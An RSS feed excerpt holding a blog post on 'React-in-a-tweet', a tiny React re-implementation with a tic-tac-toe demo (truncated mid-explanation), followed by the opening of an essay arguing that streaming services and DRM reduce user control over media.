<div><div><pre><code><span>React</span><span>=</span><span>{</span><span>Component</span><span>:</span><span>function</span><span>(</span><span>e</span><span>){</span><span>this</span><span>.</span><span>props</span><span>=</span><span>e</span><span>},[</span><span>C</span><span>=</span><span>"</span><span>createElement</span><span>"</span><span>]:(</span><span>t</span><span>,</span><span>s</span><span>,...</span><span>a</span><span>)</span><span>=&gt;</span><span>t</span><span>.</span><span>bind</span><span>?</span><span>new</span> <span>t</span><span>(</span><span>s</span><span>):(</span><span>e</span><span>=</span><span>document</span><span>[</span><span>C</span><span>](</span><span>t</span><span>),(()</span><span>=&gt;</span><span>{</span><span>for</span><span>(</span><span>n</span> <span>in</span> <span>s</span><span>)</span><span>e</span><span>[</span><span>n</span><span>]</span><span>=</span><span>s</span><span>[</span><span>n</span><span>]})(),</span><span>g</span><span>(</span><span>a</span><span>).</span><span>map</span><span>(</span><span>t</span><span>=&gt;</span><span>e</span><span>[</span><span>A</span><span>](</span><span>t</span><span>.</span><span>props</span><span>?</span><span>t</span><span>.</span><span>render</span><span>():</span><span>t</span><span>.</span><span>part</span><span>?</span><span>t</span><span>:</span><span>new</span> <span>Text</span><span>(</span><span>t</span><span>))),</span><span>e</span><span>)},</span><span>A</span><span>=</span><span>"</span><span>appendChild</span><span>"</span><span>,</span><span>g</span><span>=</span><span>(</span><span>e</span><span>=&gt;</span><span>(</span><span>e</span><span>=</span><span>e</span><span>||</span><span>[],</span><span>e</span><span>.</span><span>map</span><span>?</span><span>e</span><span>.</span><span>flatMap</span><span>(</span><span>g</span><span>):[</span><span>e</span><span>]))</span>
</code></pre></div></div>

<p>What does the above do?</p>

<ul>
  <li>Defines a global <a href="https://reactjs.org/docs/react-api.html"><code>React</code></a>.</li>
  <li>Defines <a href="https://reactjs.org/docs/react-component.html"><code>React.Component</code></a>,
the component base class.</li>
  <li>Defines
<a href="https://reactjs.org/docs/react-api.html#createelement"><code>React.createElement</code></a>
which can create both HTML primitives and custom components.</li>
  <li><code>React.createElement</code> also accepts <code>props</code>, and <code>children</code> which get appended
to the created DOM element.</li>
  <li>JSX essentially transpiles to <code>React.createElement</code> calls, with contents
passed in as <code>children</code> argument. These <code>children</code> can be custom components,
primitive HTML elements, or plain text. Code handles them all correctly.</li>
</ul>

<h2 id="what-how">WHAT! HOW?</h2>

<p>Read the annotated, prettified code below for line-by-line explanation.</p>

<p>For now, moving on to more features!</p>

<h2 id="react-dom--state-management">React DOM + State management</h2>

<p>You can bring in React DOM and React’s State management API come as a separate
plugin, implemented in another tweet!</p>

<div><div><pre><code><span>ReactDOM</span><span>=</span><span>{</span><span>render</span><span>:(</span><span>e</span><span>,</span><span>t</span><span>)</span><span>=&gt;</span><span>(</span><span>e</span><span>.</span><span>h</span><span>=</span><span>t</span><span>,</span><span>t</span><span>[</span><span>A</span><span>](</span><span>e</span><span>.</span><span>render</span><span>()))},</span><span>React</span><span>.</span><span>Component</span><span>.</span><span>prototype</span><span>.</span><span>setState</span><span>=</span><span>function</span><span>(</span><span>e</span><span>){</span><span>this</span><span>.</span><span>state</span><span>=</span><span>{...</span><span>this</span><span>.</span><span>state</span><span>,...</span><span>e</span><span>},</span><span>this</span><span>.</span><span>h</span><span>.</span><span>innerHTML</span><span>=</span><span>""</span><span>,</span><span>ReactDOM</span><span>.</span><span>render</span><span>(</span><span>this</span><span>,</span><span>this</span><span>.</span><span>h</span><span>)};</span>
</code></pre></div></div>

<p>What does the above define?</p>

<ul>
  <li>A global <code>ReactDOM</code>.</li>
  <li><a href="https://reactjs.org/docs/react-dom.html#render"><code>ReactDOM.render</code></a> function
to trigger re-renders.</li>
  <li><a href="https://reactjs.org/docs/react-component.html#setstate"><code>React.Component#setState</code></a>
to set component-level state that triggers a re-render of that component.</li>
</ul>

<h2 id="demo">Demo</h2>

<p>Let’s build React’s own <a href="https://reactjs.org/tutorial/tutorial.html">Tic-tac-toe
tutorial</a> with React-in-a-tweet™.</p>

<p>You can fiddle with the following over at
<a href="https://jsfiddle.net/asyncanup/0bzfy1sq/">JSFiddle</a>, or try it out right here!</p>

<center>
  
</center>

<p>Video of working example:</p>

<video autoplay="" loop="" controls="" width="500">
  <source src="https://anupbishnoi.com/public/img/react-tic-tac-toe-demo.mp4" type="video/mp4">
  Watch a video <a href="https://anupbishnoi.com/public/img/react-tic-tac-toe-demo.mp4">here</a>
</video>

<h2 id="usage-code">Usage code</h2>

<p>Here’s how that sweet sweet demo is implemented.</p>

<p>Throw in a root HTML element:</p>



<p>Sprinkle some CSS to make things look right (from <a href="https://reactjs.org/tutorial/tutorial.html">React tutorial</a>):</p>

<div><div><pre><code><span>body</span> <span>{</span> <span>font</span><span>:</span> <span>14px</span> <span>"Century Gothic"</span><span>,</span> <span>Futura</span><span>,</span> <span>sans-serif</span><span>;</span> <span>margin</span><span>:</span> <span>20px</span><span>;</span> <span>}</span>
<span>ol</span><span>,</span> <span>ul</span> <span>{</span> <span>padding-left</span><span>:</span> <span>30px</span><span>;</span> <span>}</span>
<span>.board-row</span><span>:after</span> <span>{</span> <span>clear</span><span>:</span> <span>both</span><span>;</span> <span>content</span><span>:</span> <span>""</span><span>;</span> <span>display</span><span>:</span> <span>table</span><span>;</span> <span>}</span>
<span>.status</span> <span>{</span> <span>margin-bottom</span><span>:</span> <span>10px</span><span>;</span> <span>}</span> 
<span>.square</span> <span>{</span>
  <span>background</span><span>:</span> <span>#fff</span><span>;</span> <span>border</span><span>:</span> <span>1px</span> <span>solid</span> <span>#999</span><span>;</span> <span>float</span><span>:</span> <span>left</span><span>;</span>
  <span>font-size</span><span>:</span> <span>24px</span><span>;</span> <span>font-weight</span><span>:</span> <span>bold</span><span>;</span> <span>line-height</span><span>:</span> <span>34px</span><span>;</span>
  <span>height</span><span>:</span> <span>34px</span><span>;</span> <span>margin-right</span><span>:</span> <span>-1px</span><span>;</span> <span>margin-top</span><span>:</span> <span>-1px</span><span>;</span>
  <span>padding</span><span>:</span> <span>0</span><span>;</span> <span>text-align</span><span>:</span> <span>center</span><span>;</span> <span>width</span><span>:</span> <span>34px</span><span>;</span>
<span>}</span>
<span>.square</span><span>:focus</span> <span>{</span> <span>outline</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
<span>.kbd-navigation</span> <span>.square</span><span>:focus</span> <span>{</span> <span>background</span><span>:</span> <span>#ddd</span><span>;</span> <span>}</span>
<span>.game</span> <span>{</span> <span>display</span><span>:</span> <span>flex</span><span>;</span> <span>flex-direction</span><span>:</span> <span>row</span><span>;</span> <span>}</span>
<span>.game-info</span> <span>{</span> <span>margin-left</span><span>:</span> <span>20px</span><span>;</span> <span>}</span>
</code></pre></div></div>

<hr>

<p>And now the work horse, the JSX-enabled usage of React-in-a-tweet™ (also lifted
from <a href="https://reactjs.org/tutorial/tutorial.html">React tutorial</a>):</p>

<div><div><pre><code><span>function</span> <span>Square</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span>&lt;</span><span>button</span> <span>className</span><span>=</span><span>"square"</span> <span>onclick</span><span>=</span><span>{</span><span>props</span><span>.</span><span>onClick</span><span>}</span><span>&gt;</span>
      <span>{</span><span>props</span><span>.</span><span>value</span><span>}</span>
    <span>&lt;/</span><span>button</span><span>&gt;</span>
  <span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Returning JSX!</p>

<p>The way that works is: Babel transpiles this JSX to <code>React.createElement</code> calls,
which are handled by React-in-a-tweet just fine.</p>

<p>Remember, JSX transpiles to <code>React.createElement()</code> calls, and passes in the
component type as the first argument, props defined in JSX as the second
argument, and any children provided as the third argument.</p>

<p>For example:</p>

<div><div><pre><code><span>&lt;</span><span>button</span> <span>className</span><span>=</span><span>"square"</span> <span>onclick</span><span>=</span><span>{</span><span>props</span><span>.</span><span>onClick</span><span>}</span><span>&gt;</span>
  Square value: <span>{</span><span>props</span><span>.</span><span>value</span><span>}</span>
  <span>&lt;</span><span>div</span><span>&gt;</span>nested<span>&lt;/</span><span>div</span><span>&gt;</span>
<span>&lt;/</span><span>button</span><span>&gt;</span>
</code></pre></div></div>

<p>transpiles to:</p>

<div><div><pre><code><span>React</span><span>.</span><span>createElement</span><span>(</span><span>"</span><span>button</span><span>"</span><span>,</span> <span>{</span>
  <span>className</span><span>:</span> <span>"</span><span>square</span><span>"</span><span>,</span>
  <span>onclick</span><span>:</span> <span>props</span><span>.</span><span>onClick</span>
<span>},</span>
  <span>"</span><span>Square value: </span><span>"</span><span>,</span> <span>props</span><span>.</span><span>value</span><span>,</span>
  <span>React</span><span>.</span><span>createElement</span><span>(</span><span>"</span><span>div</span><span>"</span><span>,</span> <span>null</span><span>,</span> <span>"</span><span>nested</span><span>"</span><span>)</span>
<span>);</span>
</code></pre></div></div>

<p>So, transpiled code includes <code>React.createElement()</code> calls that contain 3 or
more arguments: <code>type</code>, <code>props</code>, and <code>...children</code>.</p>

<p>Also notice that the click handler on <code>button</code> above has the DOM-defined name
<code>onclick</code>, instead of the name that React gives it - <code>onClick</code>.</p>

<p>This is because React-in-a-tweet does not implement React’s
<a href="https://reactjs.org/docs/handling-events.html#gatsby-focus-wrapper">synthetic events</a>.
But, just like React, you can still assign functions to <code>onclick</code>.</p>

<p>Wait, what about <code>props.onClick</code> though? Why isn’t it it <code>props.onclick</code>?
Well, that’s just a prop name, which can be anything you like :)</p>

<hr>

<p>Moving on to more definitions:</p>

<div><div><pre><code><span>class</span> <span>Board</span> <span>extends</span> <span>React</span><span>.</span><span>Component</span> <span>{</span>
  <span>renderSquare</span><span>(</span><span>i</span><span>)</span> <span>{</span>
    <span>return</span> <span>(</span>
      <span>&lt;</span><span>Square</span>
        <span>value</span><span>=</span><span>{</span><span>this</span><span>.</span><span>props</span><span>.</span><span>squares</span><span>[</span><span>i</span><span>]</span><span>}</span>
        <span>onClick</span><span>=</span><span>{</span><span>()</span> <span>=&gt;</span> <span>this</span><span>.</span><span>props</span><span>.</span><span>onClick</span><span>(</span><span>i</span><span>)</span><span>}</span>
      <span>/&gt;</span>
    <span>);</span>
  <span>}</span>

  <span>render</span><span>()</span> <span>{</span>
    <span>return</span> <span>(</span>
      <span>&lt;</span><span>div</span><span>&gt;</span>
        <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"board-row"</span><span>&gt;</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>0</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>1</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>2</span><span>)</span><span>}</span>
        <span>&lt;/</span><span>div</span><span>&gt;</span>
        <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"board-row"</span><span>&gt;</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>3</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>4</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>5</span><span>)</span><span>}</span>
        <span>&lt;/</span><span>div</span><span>&gt;</span>
        <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"board-row"</span><span>&gt;</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>6</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>7</span><span>)</span><span>}</span>
          <span>{</span><span>this</span><span>.</span><span>renderSquare</span><span>(</span><span>8</span><span>)</span><span>}</span>
        <span>&lt;/</span><span>div</span><span>&gt;</span>
      <span>&lt;/</span><span>div</span><span>&gt;</span>
    <span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Notice how <code>Board</code>’s <code>render</code> function can call <code>this.renderSquare()</code> to fill in
parts of the rendered output. Works just fine.</p>

<p><code>renderSquare()</code> returns a <em>custom component</em>, <code>Square</code>, not an HTML primitive.
Works fine.</p>

<p>Also notice how the <code>onClick</code> handler defined in <code>renderSquare()</code> is just an
arrow function. Works great.</p>

<p>But wait, what’s <code>className</code> doing there? Isn’t that a React-ified HTML attribute
name?
Well, no siree.
<a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/className"><code>className</code></a>
is pure DOM API. Works as is.</p>

<hr>

<p>Now let’s define the root game component itself:</p>

<div><div><pre><code><span>class</span> <span>Game</span> <span>extends</span> <span>React</span><span>.</span><span>Component</span> <span>{</span>
  <span>constructor</span><span>(</span><span>props</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span><span>props</span><span>);</span>
    <span>this</span><span>.</span><span>state</span> <span>=</span> <span>{</span>
      <span>history</span><span>:</span> <span>[</span>
        <span>{</span>
          <span>squares</span><span>:</span> <span>Array</span><span>(</span><span>9</span><span>).</span><span>fill</span><span>(</span><span>null</span><span>)</span>
        <span>}</span>
      <span>],</span>
      <span>stepNumber</span><span>:</span> <span>0</span><span>,</span>
      <span>xIsNext</span><span>:</span> <span>true</span>
    <span>};</span>
  <span>}</span>

  <span>handleClick</span><span>(</span><span>i</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>handleClick</span><span>'</span><span>,</span> <span>i</span><span>);</span>
    <span>const</span> <span>history</span> <span>=</span> <span>this</span><span>.</span><span>state</span><span>.</span><span>history</span><span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>this</span><span>.</span><span>state</span><span>.</span><span>stepNumber</span> <span>+</span> <span>1</span><span>);</span>
    <span>const</span> <span>current</span> <span>=</span> <span>history</span><span>[</span><span>history</span><span>.</span><span>length</span> <span>-</span> <span>1</span><span>];</span>
    <span>const</span> <span>squares</span> <span>=</span> <span>current</span><span>.</span><span>squares</span><span>.</span><span>slice</span><span>();</span>
    <span>if</span> <span>(</span><span>calculateWinner</span><span>(</span><span>squares</span><span>)</span> <span>||</span> <span>squares</span><span>[</span><span>i</span><span>])</span> <span>{</span>
      <span>return</span><span>;</span>
    <span>}</span>
    <span>squares</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>this</span><span>.</span><span>state</span><span>.</span><span>xIsNext</span> <span>?</span> <span>"</span><span>X</span><span>"</span> <span>:</span> <span>"</span><span>O</span><span>"</span><span>;</span>
    <span>this</span><span>.</span><span>setState</span><span>({</span>
      <span>history</span><span>:</span> <span>history</span><span>.</span><span>concat</span><span>([</span>
        <span>{</span>
          <span>squares</span><span>:</span> <span>squares</span>
        <span>}</span>
      <span>]),</span>
      <span>stepNumber</span><span>:</span> <span>history</span><span>.</span><span>length</span><span>,</span>
      <span>xIsNext</span><span>:</span> <span>!</span><span>this</span><span>.</span><span>state</span><span>.</span><span>xIsNext</span>
    <span>});</span>
  <span>}</span>

  <span>jumpTo</span><span>(</span><span>step</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>setState</span><span>({</span>
      <span>stepNumber</span><span>:</span> <span>step</span><span>,</span>
      <span>xIsNext</span><span>:</span> <span>(</span><span>step</span> <span>%</span> <span>2</span><span>)</span> <span>===</span> <span>0</span>
    <span>});</span>
  <span>}</span>

  <span>render</span><span>()</span> <span>{</span>
    <span>const</span> <span>history</span> <span>=</span> <span>this</span><span>.</span><span>state</span><span>.</span><span>history</span><span>;</span>
    <span>const</span> <span>current</span> <span>=</span> <span>history</span><span>[</span><span>this</span><span>.</span><span>state</span><span>.</span><span>stepNumber</span><span>];</span>
    <span>const</span> <span>winner</span> <span>=</span> <span>calculateWinner</span><span>(</span><span>current</span><span>.</span><span>squares</span><span>);</span>

    <span>const</span> <span>moves</span> <span>=</span> <span>history</span><span>.</span><span>map</span><span>((</span><span>step</span><span>,</span> <span>move</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>const</span> <span>desc</span> <span>=</span> <span>move</span> <span>?</span>
        <span>'</span><span>Go to move #</span><span>'</span> <span>+</span> <span>move</span> <span>:</span>
        <span>'</span><span>Go to game start</span><span>'</span><span>;</span>
      <span>return</span> <span>(</span>
        <span>&lt;</span><span>li</span> <span>key</span><span>=</span><span>{</span><span>move</span><span>}</span><span>&gt;</span>
          <span>&lt;</span><span>button</span> <span>onclick</span><span>=</span><span>{</span><span>()</span> <span>=&gt;</span> <span>this</span><span>.</span><span>jumpTo</span><span>(</span><span>move</span><span>)</span><span>}</span><span>&gt;</span><span>{</span><span>desc</span><span>}</span><span>&lt;/</span><span>button</span><span>&gt;</span>
        <span>&lt;/</span><span>li</span><span>&gt;</span>
      <span>);</span>
    <span>});</span>

    <span>let</span> <span>status</span><span>;</span>
    <span>if</span> <span>(</span><span>winner</span><span>)</span> <span>{</span>
      <span>status</span> <span>=</span> <span>"</span><span>Winner: </span><span>"</span> <span>+</span> <span>winner</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>status</span> <span>=</span> <span>"</span><span>Next player: </span><span>"</span> <span>+</span> <span>(</span><span>this</span><span>.</span><span>state</span><span>.</span><span>xIsNext</span> <span>?</span> <span>"</span><span>X</span><span>"</span> <span>:</span> <span>"</span><span>O</span><span>"</span><span>);</span>
    <span>}</span>

    <span>return</span> <span>(</span>
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"game"</span><span>&gt;</span>
        <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"game-board"</span><span>&gt;</span>
          <span>&lt;</span><span>Board</span>
            <span>squares</span><span>=</span><span>{</span><span>current</span><span>.</span><span>squares</span><span>}</span>
            <span>onClick</span><span>=</span><span>{</span><span>i</span> <span>=&gt;</span> <span>this</span><span>.</span><span>handleClick</span><span>(</span><span>i</span><span>)</span><span>}</span>
          <span>/&gt;</span>
        <span>&lt;/</span><span>div</span><span>&gt;</span>
        <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"game-info"</span><span>&gt;</span>
          <span>&lt;</span><span>div</span><span>&gt;</span><span>{</span><span>status</span><span>}</span><span>&lt;/</span><span>div</span><span>&gt;</span>
          <span>&lt;</span><span>ol</span><span>&gt;</span><span>{</span><span>moves</span><span>}</span><span>&lt;/</span><span>ol</span><span>&gt;</span>
        <span>&lt;/</span><span>div</span><span>&gt;</span>
      <span>&lt;/</span><span>div</span><span>&gt;</span>
    <span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>So much code! Well, as far as React API is concerned, there are only a few
interesting things going on in there.</p>

<ul>
  <li><code>Game</code>’s <code>constructor</code> sets initial state (<code>this.state</code>), storing <code>history</code>
and other Tic-tac-toe-specific data.</li>
  <li><code>handleClick</code> click handler uses <code>this.setState()</code> and passes in new state.</li>
  <li><code>render</code> does conditional rendering based on whether the game has been won
yet, and returns JSX for the entire game board.</li>
  <li>Since game state is defined entirely as <code>Game</code>’s React state, the entire game
board will re-render on every game state change in this example. Regardless of
this example, React-in-a-tweet does allow re-rendering specific parts of a UI
as long as those specific UI sections hold their own state, instead of
depending on a single global state.</li>
</ul>

<div><div><pre><code><span>ReactDOM</span><span>.</span><span>render</span><span>(&lt;</span><span>Game</span> <span>/&gt;,</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"</span><span>root</span><span>"</span><span>));</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>'</span><span>✓</span><span>'</span><span>)</span>
</code></pre></div></div>

<p>React DOM API that triggers the first-render, y’all. Passing in JSX for <code>&lt;Game
/&gt;</code> works. It’s just the React you know and love!</p>

<hr>

<p>Finally, a helper function that calculates winner after every move:</p>

<div><div><pre><code><span>function</span> <span>calculateWinner</span><span>(</span><span>squares</span><span>)</span> <span>{</span>
  <span>const</span> <span>lines</span> <span>=</span> <span>[[</span><span>0</span><span>,</span><span>1</span><span>,</span><span>2</span><span>],</span> <span>[</span><span>3</span><span>,</span><span>4</span><span>,</span><span>5</span><span>],</span> <span>[</span><span>6</span><span>,</span><span>7</span><span>,</span><span>8</span><span>],</span> <span>[</span><span>0</span><span>,</span><span>3</span><span>,</span><span>6</span><span>],</span> <span>[</span><span>1</span><span>,</span><span>4</span><span>,</span><span>7</span><span>],</span> <span>[</span><span>2</span><span>,</span><span>5</span><span>,</span><span>8</span><span>],</span> <span>[</span><span>0</span><span>,</span><span>4</span><span>,</span><span>8</span><span>],</span> <span>[</span><span>2</span><span>,</span><span>4</span><span>,</span><span>6</span><span>]];</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>lines</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>const</span> <span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>]</span> <span>=</span> <span>lines</span><span>[</span><span>i</span><span>];</span>
    <span>if</span> <span>(</span><span>squares</span><span>[</span><span>a</span><span>]</span> <span>&amp;&amp;</span> <span>squares</span><span>[</span><span>a</span><span>]</span> <span>===</span> <span>squares</span><span>[</span><span>b</span><span>]</span> <span>&amp;&amp;</span> <span>squares</span><span>[</span><span>a</span><span>]</span> <span>===</span> <span>squares</span><span>[</span><span>c</span><span>])</span> <span>return</span> <span>squares</span><span>[</span><span>a</span><span>];</span>
  <span>}</span>
  <span>return</span> <span>null</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<h2 id="wait-how-does-react-in-a-tweet-itself-work">Wait, how does React-in-a-tweet itself work?</h2>

<p>Glad you asked!</p>

<p>Here’s a line-by-line explanation of the tweet-sized source code
of React-in-a-tweet:</p>

<p>Define <code>React</code> global:</p>



<p>Define and implement the following API:</p>

<ul>
  <li><code>React.Component</code>, just a simple base class which stores the <code>props</code> passed
to it.</li>
</ul>

<div><div><pre><code>    <span>Component</span><span>:</span> <span>function</span><span>(</span><span>p</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>props</span> <span>=</span> <span>p</span>
    <span>},</span>
</code></pre></div></div>

<ul>
  <li><code>React.createElement</code>, the work horse of rendering, which accepts:
    <ul>
      <li><code>t</code>, HTML type name or React component class,</li>
      <li><code>p</code>, props</li>
      <li><code>...c</code>, children to be appended to the dom element created.</li>
    </ul>
  </li>
</ul>

<div><div><pre><code>    <span>[</span><span>C</span> <span>=</span> <span>'</span><span>createElement</span><span>'</span><span>]:</span> <span>(</span><span>t</span><span>,</span> <span>p</span><span>,</span> <span>...</span><span>c</span><span>)</span> <span>=&gt;</span> <span>(</span>
</code></pre></div></div>

<p>In the case of <code>t</code> being a React-in-a-tweet component class, ie, a constructor
function derived from <code>React.Component</code>, we can just instantiate that function
with passed props and return the resulting React component instance.</p>



<p>Otherwise, <code>t</code> is an HTML primitive element name, like <code>button</code>, or <code>span</code>. In
this case, …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://anupbishnoi.com/2019/react-in-a-tweet/">https://anupbishnoi.com/2019/react-in-a-tweet/</a></em></p>]]>
            </description>
            <link>https://anupbishnoi.com/2019/react-in-a-tweet/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202779</guid>
            <pubDate>Tue, 24 Nov 2020 20:40:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The war we forgot in our embrace of streaming]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202726">thread link</a>) | @mattbierner
<br/>
November 24, 2020 | https://blog.mattbierner.com/the-war-we-forgot/ | <a href="https://web.archive.org/web/*/https://blog.mattbierner.com/the-war-we-forgot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
    

    <p>I listened to Spotify for somewhere around 650 hours in 2019. That works out to a little over 27 solid days. That’s a lot of music!</p>

<p>I’m from the iPod generation, so the novelty of millions of songs in my pocket for $10 a month hasn’t entirely worn off. Spotify has changed my life. That’s only a minor exaggeration. In the old world of record stores and $0.99 iTunes singles, I never would have discovered artists like <a href="https://jeremiahkane.bandcamp.com/">Jeremiah Kane</a> or subgenres like <a href="https://giallodiscorecords.bandcamp.com/album/apocalypse-domani">Italian Horror Disco</a> which have had big impacts on both my day-to-day life and my creative work. The other great thing about streaming services like Spotify is that they let me focus on what I actually care about: the music! No more hours spent ripping CDs or scouring Limewire, no more nights wasted managing a media library and transferring songs between devices. It’s been so freeing.</p>

<p>Those 650 hours were on just one streaming service too. For a few bucks more a month, I can also stream tens of thousands of movies and shows through services such as Amazon or Netflix. And that’s all without even touching on services such as YouTube! If anything, the biggest problem facing consumers today is that there’s far too much content to choose from.</p>

<p>I’ve been happy gorging myself at this media buffet for years, until a recent project got me thinking about what shifting to a streaming only world means. Because while services such as Spotify or Netflix are in many ways better than what came before, it’s still worth trying to understand what we risk losing in this transition.</p>

<p>I have rarely seen this topic discussed in terms that I connect with. In this post, I want to go beyond typical concerns such as losing access to your library when your subscription lapses, to instead focus on how streaming can effect culture, and specifically remix culture. For, despite the flashy apps and all the billions and billions of dollars spent on new content, I’ve come to believe that streaming services take user control away and are actually quite regressive in many respects.</p>

<p>Ultimately, I feel that the biggest threat of streaming is its view that media is meant only for consumption. This view would be dangerous enough if it were restricted to the domain of streaming, but with streaming currently busy eating the world, I fear it will also come to dominate how we think about our media more broadly. This won’t happen overnight. In fact, we may not even realize that it is happening. The convenience and selection that streaming media promises has blinded us and made us forget a war that we (or at least the most nerdy ones among us) used to care deeply about: the war on DRM. By abandoning this war, we risk losing not only practical control over our media, but also our ability to imagine what our media could be and imagine how we could relate to it differently.</p>



<p>Before we continue though, a word about me: I’m not a musician, I’m not a video producer, and I’m certainly not a copyright lawyer. I’m just a nerd who likes music.</p>

<p>So what inspired this post? Well, to be perfectly honest, it was born from self interest. Streaming and DRM weren’t subjects I had ever given much thought to, let alone wanted to spend a weekend writing about. I was pretty happy with the status quo. That starting changing when I ran into a problem a few months back while building a new app.</p>

<p>You see, for the longest time I’ve wanted to use technology to somehow make the world dance along to my music. This year I finally figured out how to pull this off well. So for the past few months, I’ve been working off and on to create an augmented reality music visualizer iOS app. The app uses music to distort your walls/floors, creating wave patterns and other fun visualizations that look like they are distorting the real world’s geometry. It’s pretty neat!</p>

<p>During prototyping, I used a hardcoded audio file which let me focus on building the basic AR effects. To actually ship the app though, I wanted to let users select their own music. It sounded simple. However, I quickly hit a number of roadblocks.</p>

<p>Here’s an abridged version of my quest to add a music selector to my iOS app. Again my goal was simple: let users play their music with my app’s visualizer. On the technical side, the only important note is that the visualizer is driven by raw audio data.</p>

<ol>
  <li>
    <p>Try adding a media selector to the app using Apple’s built-in media picker UI: <a href="https://developer.apple.com/documentation/mediaplayer/mpmediapickercontroller"><code>MPMediaPickerController</code></a>.</p>

    <p>Discover that <code>MPMediaPickerController</code> shows nothing because I don’t actually have any songs in my phone’s music library.</p>
  </li>
  <li>
    <p>Remember that all of “my music” is actually in Spotify. Remember that Spotify has <a href="https://developer.spotify.com/documentation/">an API</a>!</p>

    <p>Discover that Spotify’s API is really more for remote control style apps. There is no way to access the raw audio data I needed for the visualizer.</p>
  </li>
  <li>
    <p>Check if Apple Music has an API I can use.</p>

    <p><a href="https://developer.apple.com/musickit/">Same issue</a>.</p>
  </li>
  <li>
    <p>Try downloading a song that I purchased on iTunes 10+ years ago.</p>

    <p>Discover that while the song now shows up in <code>MPMediaPickerController</code>, my app can’t access the raw audio data because the old song still has DRM.</p>
  </li>
  <li>
    <p>Go to Bandcamp, download a DRM free song, copy it over to my phone.</p>

    <p>Finally <code>MPMediaPickerController</code> works! Except I don’t own many of the songs I’d like to try in the app. Plus, now I have to manually copy music around like it’s 2003?</p>
  </li>
  <li>
    <p>Suspect that many users will be in the same boat, so see if my app can use a low level audio API to access the currently playing audio on the device.</p>

    <p>Discover that this also does not seem possible, likely for content protection reasons. (Although I won’t go so far as to say it is completely impossible. It may be possible if the music app your app tries to listen to consents or if you are some sort of iOS audio wizard.)</p>
  </li>
</ol>

<p>The only way I’ve found to let users easily visualize their music is by recording from the microphone while music plays over the speaker. Existing music visualizer apps that I’ve found on the App Store seem to have similar limitations. This just seems crazy to me!</p>

<p>So that’s where this post came from: I wanted to build a silly app about making walls dance, and streaming/DRM got in my way. The motivation is not exactly noble sounding when I put it in those terms.</p>

<p>But the app development problems I ran into aren’t nearly as interesting as the thinking they inspired. These problems got me thinking about big concepts like ownership and remixing. And this helped me realize that streaming takes away user control. Understanding all this got me wondering not only about the consequences of this loss of control, but why we mostly all have been just fine with this.</p>



<p>To watch Netflix, you have to use the Netflix app. To watch HBO, you have to use the HBO Max app. To watch Disney, you have to use the Disney Plus app.</p>

<p>Seems obvious enough. But why?</p>

<p>Why do I need apps from these providers at all? It’s not like using the Netflix app is some magical experience. 95% of the time, it’s just a fullscreen video. Any html <code>&lt;video&gt;</code> tag can do that!</p>

<p>So as long as my Netflix subscription is valid, shouldn’t I be able to load up Netflix content in any number of third party apps? Who knows, some of these third party apps might work on older or more niche devices that the official app doesn’t support. They may even have some neat UI ideas or unique features. After all, if anyone could develop a Netflix viewing app, then developers would have to work to make their app stand out from the pack. Having a vibrant app ecosystem seems like it would be a plus for these streaming providers, right?</p>

<p>But this gets to one of the fundamental misunderstandings that I had about streaming services. This misunderstanding explains why I just kind of assumed that it would be simple to hook my AR music visualizer up to a service like Spotify or Apple music.</p>

<p>Let’s take Netflix for example. When I first subscribed, I imagined that my $12 a month was buying me unlimited access to a huge library of Netflix content. However that’s not strictly accurate. Instead, my subscription lets me use sanctioned Netflix apps to view Netflix content. And while this distinction may seem like splitting hairs—especially when Netflix sanctioned apps exist for just about every modern device—I believe understanding it is a key first step in seeing the limitations of our current crop of streaming services.</p>

